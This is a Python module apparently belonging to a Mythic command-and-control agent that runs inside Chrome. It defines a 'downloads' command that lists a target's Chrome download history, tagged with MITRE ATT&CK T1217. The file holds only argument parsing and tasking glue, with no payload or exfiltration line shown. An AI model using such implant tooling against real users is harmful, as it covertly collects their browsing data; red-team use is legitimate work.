from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class DownloadsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="query",
                type=ParameterType.String,
                description="Filename or URL filter",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="limit",
                type=ParameterType.Number,
                description="Maximum results",
                default_value=50,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        self.add_arg("query", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class DownloadsCommand(CommandBase):
    cmd = "downloads"
    needs_admin = False
    help_cmd = "downloads [query]"
    description = "List Chrome downloads"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1217"]
    argument_class = DownloadsArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return wired_tasking(taskData, taskData.args.get_arg("query") or "")

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
